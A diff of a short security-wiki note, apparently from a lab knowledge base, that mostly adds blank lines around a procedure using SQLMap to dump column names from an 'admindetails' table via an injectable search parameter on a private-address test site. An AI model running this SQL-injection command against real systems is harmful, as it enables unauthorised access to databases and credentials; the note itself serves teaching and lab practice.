@@ -35,15 +35,33 @@ SQLMap is an automated SQL Injection exploitation tool. This can be used to inse
 
 *--D is used to specify the database name, --T to specify the table name and --columns to list the column names*
 
+
+
 # Procedure
 
+
+
 1. The below SQLMap command can be used to dump the column names from the table.
+
+
+
+
+
+
+
+
 
 **Command** ([[SQLMap to Dump Column Names]]):
 
 ```bash
 sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --columns
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -61,3 +79,5 @@ sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --co
 - [[SQL Injection]]
 - [[SQLMap]]
 - [[Web Applications]]
+
+
